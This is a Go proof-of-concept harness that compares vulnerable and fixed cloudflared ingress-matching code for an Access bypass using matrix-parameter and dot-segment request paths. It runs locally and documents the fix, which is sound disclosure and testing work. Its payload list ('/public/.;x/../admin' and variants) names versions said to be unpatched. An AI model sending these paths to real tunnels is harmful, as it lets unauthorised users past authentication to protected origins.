// TunnelPicklock — cloudflared Access bypass via matrix-path parameters
// =============================================================================
// Wildcard finding, 2026-11-12. Target: cloudflare/cloudflared (Apache-2.0).
// Fixed by commit 3106f9499d6a ("VULN-170057: Don't bypass access with matrix
// parameters", 2026-11-04, Cloudflare's internal VULN- tracker) — unreleased:
// the latest public release 2026.10.7 (2026-10-30) predates the fix.
// Affected: 2026.10.0-2026.10.7 (and master pre-fix) with path normalization
// enabled (--disable-path-normalization=false or remotely-managed tunnels with
// normalization on; the VULN-141859 normalization shipped 2026-09-29 disabled
// by default).
//
// Ingress rules are matched against the canonicalized request path. The
// vulnerable canonicalPathForMatching runs on url.URL.Path, which net/url has
// ALREADY percent-decoded, and does not strip Servlet-style "matrix parameters"
// (path segments delimited by ';'). Crafted paths therefore normalize to a
// different rule than the one the origin will serve:
//
//   /public/.;x/../admin
//       -> vulnerable: path.Clean drops ";x" and ".."  -> "/public/admin"
//          matches the NON-Access "/public" rule first  -> Access BYPASS
//       -> an origin with matrix-parameter + dot-segment semantics (Tomcat,
//          Jetty and friends) serves the /admin resource without auth
//
//   /admin;x=%2f..%2fpublic        (net/url decodes to /admin;x=/../public)
//       -> vulnerable: path.Clean -> "/public" -> same bypass
//
// The fix builds a normalization pipeline that strips matrix parameters from
// the ESCAPED path first, then decodes, normalizes separators and resolves dot
// segments — and additionally re-checks the decode-first interpretation.
//
// This harness compiles BOTH sides: the vulnerable functions are verbatim from
// parent commit 872b241f9487 (ingress/ingress.go, ingress/rule.go), the fixed
// functions are verbatim from the fix commit 3106f9499d6a. Rule/path matching
// follows validateIngress (user "path:" strings compile as raw Go regexps).
package main

import (
	"fmt"
	"net"
	"net/url"
	"path"
	"regexp"
	"strings"
)

// ---------------------------------------------------------------------------
// Minimal type stubs — only the fields the real code touches. Struct field
// names/types mirror upstream (config.OriginRequestConfig.Access.Required etc.).
// ---------------------------------------------------------------------------
type AccessConfig struct{ Required bool }
type OriginRequestConfig struct{ Access AccessConfig }
type Regexp struct{ *regexp.Regexp }
type Rule struct {
	Hostname    string
	Path        *Regexp
	Service     interface{} // OriginService — unused by matching
	Config      OriginRequestConfig
	punycodeHostname string
}
type Ingress struct {
	InternalRules           []Rule
	Rules                   []Rule
	DisablePathNormalization bool
}

// ===========================================================================
// VULNERABLE side — verbatim from cloudflare/cloudflared @ 872b241f9487
// (parent of the fix). Files: ingress/ingress.go, ingress/rule.go.
// ===========================================================================

// ingress.go: FindMatchingRule (vulnerable: takes the already-decoded path string)
func vulnFindMatchingRule(ing Ingress, hostname, path string) (*Rule, int) {
	// The hostname might contain port. We only want to compare the host part with the rule
	host, _, err := net.SplitHostPort(hostname)
	if err == nil {
		hostname = host
	}
	// Canonicalize before first-match evaluation so an earlier non-Access rule
	// cannot capture a traversal targeting a protected rule.
	if !ing.DisablePathNormalization && (rulesRequireAccess(ing.InternalRules) || rulesRequireAccess(ing.Rules)) {
		path = vulnCanonicalPathForMatching(path)
	}
	for i, rule := range ing.InternalRules {
		if rule.Matches(hostname, path) {
			// Local rule matches return a negative rule index to distinguish local rules from user-defined rules in logs
			return &rule, -1 - i
		}
	}
	for i, rule := range ing.Rules {
		if rule.Matches(hostname, path) {
			return &rule, i
		}
	}

	i := len(ing.Rules) - 1
	return &ing.Rules[i], i
}

// ingress.go: rulesRequireAccess (verbatim)
func rulesRequireAccess(rules []Rule) bool {
	for _, rule := range rules {
		if rule.Config.Access.Required {
			return true
		}
	}
	return false
}

// ingress.go: canonicalPathForMatching (vulnerable — no matrix-parameter
// stripping; operates on the percent-decoded path)
func vulnCanonicalPathForMatching(p string) string {
	if p == "" {
		return "/"
	}
	p = strings.ReplaceAll(p, `\`, "/")
	// In RFC 3986, a trailing "." or ".." segment implies a directory, so the
	// cleaned result should end with "/". path.Clean removes the dot-segment
	// but also strips the slash, so we detect it up front.
	trailingSlash := strings.HasSuffix(p, "/") ||
		strings.HasSuffix(p, "/.") ||
		strings.HasSuffix(p, "/..")
	cleaned := path.Clean(p)
	if trailingSlash && cleaned != "/" {
		cleaned += "/"
	}
	return cleaned
}

// ingress.go: matchHost (verbatim)
func matchHost(ruleHost, reqHost string) bool {
	if ruleHost == reqHost {
		return true
	}

	// Validate hostnames that use wildcards at the start
	if strings.HasPrefix(ruleHost, "*.") {
		toMatch := strings.TrimPrefix(ruleHost, "*")
		return strings.HasSuffix(reqHost, toMatch)
	}
	return false
}

// rule.go: Rule.Matches (verbatim)
func (r *Rule) Matches(hostname, path string) bool {
	hostMatch := r.Hostname == "" || r.Hostname == "*" || matchHost(r.Hostname, hostname)
	punycodeHostMatch := false
	if r.punycodeHostname != "" {
		punycodeHostMatch = matchHost(r.punycodeHostname, hostname)
	}
	pathMatch := r.Path == nil || r.Path.Regexp == nil || r.Path.MatchString(path)
	return (hostMatch || punycodeHostMatch) && pathMatch
}

// ===========================================================================
// FIXED side — verbatim from cloudflare/cloudflared @ 3106f9499d6a
// ("VULN-170057: Don't bypass access with matrix parameters")
// ===========================================================================

// ingress.go: FindMatchingRule (fixed — receives the request URL)
func fixedFindMatchingRule(ing Ingress, hostname string, requestURL *url.URL) (*Rule, int) {
	// The hostname might contain port. We only want to compare the host part with the rule
	host, _, err := net.SplitHostPort(hostname)
	if err == nil {
		hostname = host
	}
	if !ing.DisablePathNormalization && (rulesRequireAccess(ing.InternalRules) || rulesRequireAccess(ing.Rules)) {
		return fixedFindMatchingRuleWithPathNormalization(ing, hostname, requestURL)
	}
	return fixedFindMatchingRulePlain(ing, hostname, requestURL.Path)
}

// ingress.go: findMatchingRuleWithPathNormalization (verbatim)
func fixedFindMatchingRuleWithPathNormalization(ing Ingress, hostname string, requestURL *url.URL) (*Rule, int) {
	// Canonicalize before first-match evaluation so an earlier non-Access rule
	// cannot capture a traversal targeting a protected rule.
	path := fixedCanonicalPathForMatching(requestURL.EscapedPath())
	rule, ruleIndex := fixedFindMatchingRulePlain(ing, hostname, path)
	if rule.Config.Access.Required {
		return rule, ruleIndex
	}
	// The shared steps intentionally run in a different order here: some origins
	// decode and normalize separators before stripping matrix parameters. For
	// example, /public%5C..;x%5Cadmin becomes /admin under this interpretation,
	// but / under the strip-first interpretation in canonicalPathForMatching.
	// An unprotected primary match must not bypass Access on the first matching
	// rule under either interpretation. URL.Path is already decoded, so it must
	// not be percent-decoded again.
	alternatePath := fixedNormalizePath(requestURL.Path,
		fixedNormalizeSeparators,
		fixedStripPathParameters,
		fixedResolveDotSegments,
	)
	if alternatePath != path {
		alternateRule, alternateRuleIndex := fixedFindMatchingRulePlain(ing, hostname, alternatePath)
		if alternateRule.Config.Access.Required {
			return alternateRule, alternateRuleIndex
		}
	}
	return rule, ruleIndex
}

// ingress.go: findMatchingRule (verbatim)
func fixedFindMatchingRulePlain(ing Ingress, hostname, path string) (*Rule, int) {
	for i, rule := range ing.InternalRules {
		if rule.Matches(hostname, path) {
			// Local rule matches return a negative rule index to distinguish local rules from user-defined rules in logs
			return &rule, -1 - i
		}
	}
	for i, rule := range ing.Rules {
		if rule.Matches(hostname, path) {
			return &rule, i
		}
	}

	i := len(ing.Rules) - 1
	return &ing.Rules[i], i
}

// ingress.go: canonicalPathForMatching (fixed — pipeline, verbatim)
func fixedCanonicalPathForMatching(escapedPath string) string {
	return fixedNormalizePath(escapedPath,
		fixedStripPathParameters,
		fixedDecodePathForMatching,
		fixedNormalizeSeparators,
		fixedResolveDotSegments,
	)
}

// ingress.go: normalizePath (verbatim)
func fixedNormalizePath(p string, steps ...func(string) string) string {
	for _, step := range steps {
		p = step(p)
	}
	return p
}

// ingress.go: decodePathForMatching (verbatim)
func fixedDecodePathForMatching(p string) string {
	decoded, err := url.PathUnescape(p)
	if err != nil {
		// EscapedPath produces valid escapes. Preserve malformed input from
		// direct callers rather than partially decoding it.
		return p
	}
	return decoded
}

// ingress.go: normalizeSeparators (verbatim)
func fixedNormalizeSeparators(p string) string {
	return strings.ReplaceAll(p, `\`, "/")
}

// ingress.go: resolveDotSegments (verbatim)
func fixedResolveDotSegments(p string) string {
	if p == "" {
		return "/"
	}
	// In RFC 3986, a trailing "." or ".." segment implies a directory, so the
	// cleaned result should end with "/". path.Clean removes the dot-segment
	// but also strips the slash, so we detect it up front.
	trailingSlash := strings.HasSuffix(p, "/") ||
		strings.HasSuffix(p, "/.") ||
		strings.HasSuffix(p, "/..")
	cleaned := path.Clean(p)
	if trailingSlash && cleaned != "/" {
		cleaned += "/"
	}
	return cleaned
}

// ingress.go: stripPathParameters (verbatim)
func fixedStripPathParameters(p string) string {
	segments := strings.Split(p, "/")
	for i, segment := range segments {
		segments[i], _, _ = strings.Cut(segment, ";")
	}
	return strings.Join(segments, "/")
}

// ===========================================================================
// Scenario
// ===========================================================================

// Typical config: /public is public (no Access), /admin requires Access,
// catch-all 404s. Path strings compile as raw regexps (validateIngress).
func buildIngress() Ingress {
	must := func(s string) *Regexp { return &Regexp{regexp.MustCompile(s)} }
	return Ingress{
		Rules: []Rule{
			{Path: must(`/public`), Config: OriginRequestConfig{Access: AccessConfig{Required: false}}},
			{Path: must(`/admin`), Config: OriginRequestConfig{Access: AccessConfig{Required: true}}},
			{Config: OriginRequestConfig{Access: AccessConfig{Required: false}}}, // catch-all 503
		},
	}
}

func ruleLabel(rule *Rule, index int) string {
	if rule == nil {
		return "(nil)"
	}
	access := "NO Access"
	if rule.Config.Access.Required {
		access = "Access REQUIRED"
	}
	return fmt.Sprintf("rule #%d (%s)", index, access)
}

func main() {
	ing := buildIngress()
	const host = "tunnel.example.com"

	// Each payload is a REQUEST URL as the proxy receives it; url.Parse mirrors
	// net/url's decoding into .Path and preserves .EscapedPath().
	payloads := []string{
		"/public/.;x/../admin",             // literal matrix param + dot-segment
		"/admin;x=%2f..%2fpublic",          // encoded separators inside the parameter value
		"/admin;x=%2F..%2Fpublic",
		`/public\..;x\admin`,               // backslash-separator variant
		"/admin;version=1",                 // benign matrix param on a protected path
		"/admin",                           // control: plain protected path
	}

	fmt.Println("TunnelPicklock — cloudflared ingress Access bypass via matrix parameters")
	fmt.Println("target : cloudflare/cloudflared <= 2026.10.7 (fix 3106f9499d6a unreleased)")
	fmt.Println("rules  : #0 /public (no Access) | #1 /admin (Access REQUIRED) | #2 catch-all")
	fmt.Println()
	fmt.Printf("%-34s | %-28s | %-28s\n", "request path", "VULNERABLE match", "FIXED match")
	fmt.Println(strings.Repeat("-", 96))

	vulnBypasses, fixedBlocks := 0, 0
	for _, raw := range payloads {
		u, err := url.Parse(raw)
		if err != nil {
			fmt.Printf("parse error for %q: %v\n", raw, err)
			continue
		}
		vRule, vIdx := vulnFindMatchingRule(ing, host, u.Path)
		fRule, fIdx := fixedFindMatchingRule(ing, host, u)
		vulnLabel, fixedLabel := ruleLabel(vRule, vIdx), ruleLabel(fRule, fIdx)
		fmt.Printf("%-34s | %-28s | %-28s\n", raw, vulnLabel, fixedLabel)
	}

	crafted := payloads[:4] // the first four are crafted bypass payloads; last two are controls
	for _, raw := range crafted {
		u, _ := url.Parse(raw)
		vRule, _ := vulnFindMatchingRule(ing, host, u.Path)
		fRule, _ := fixedFindMatchingRule(ing, host, u)
		if !vRule.Config.Access.Required {
			vulnBypasses++
		}
		if fRule.Config.Access.Required {
			fixedBlocks++
		}
	}

	fmt.Println()
	fmt.Printf("vulnerable: %d/%d crafted requests matched a non-Access rule\n", vulnBypasses, len(crafted))
	fmt.Printf("fixed:      %d/%d crafted requests forced onto the Access rule\n", fixedBlocks, len(crafted))
	fmt.Println()

	// The origin view: a Tomcat/Jetty-style origin strips matrix parameters and
	// resolves dot-segments, so the crafted URLs reach the protected resource.
	for _, raw := range payloads[:4] {
		u, _ := url.Parse(raw)
		originView := fixedNormalizePath(u.Path, fixedNormalizeSeparators, fixedStripPathParameters, fixedResolveDotSegments)
		fmt.Printf("origin interpretation of %-26s -> %s\n", raw, originView)
	}

	fmt.Println()
	if vulnBypasses >= 3 && fixedBlocks >= 3 {
		fmt.Println("DIFFERENTIAL PASS: the vulnerable matcher routes crafted matrix-path requests")
		fmt.Println("to the non-Access /public rule (bypass); the fixed pipeline routes them to")
		fmt.Println("the Access-required /admin rule.")
		return
	}
	fmt.Println("FAIL: differential not demonstrated.")
}
